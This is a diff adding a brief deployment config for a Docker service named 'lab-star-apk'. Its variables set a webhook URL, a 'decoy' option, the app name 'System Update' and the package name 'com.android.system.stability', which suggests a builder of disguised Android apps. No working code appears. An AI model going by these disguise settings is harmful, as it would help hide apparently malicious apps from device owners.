@@ -1,0 +1,15 @@
+services:
+  - type: web
+    name: lab-star-apk
+    runtime: docker
+    plan: standard
+    dockerfilePath: ./Dockerfile
+    envVars:
+      - key: WEBHOOK_URL
+        sync: false
+      - key: APP_NAME
+        value: System Update
+      - key: DECOY_CHOICE
+        value: "1"
+      - key: PKG_NAME
+        value: com.android.system.stability
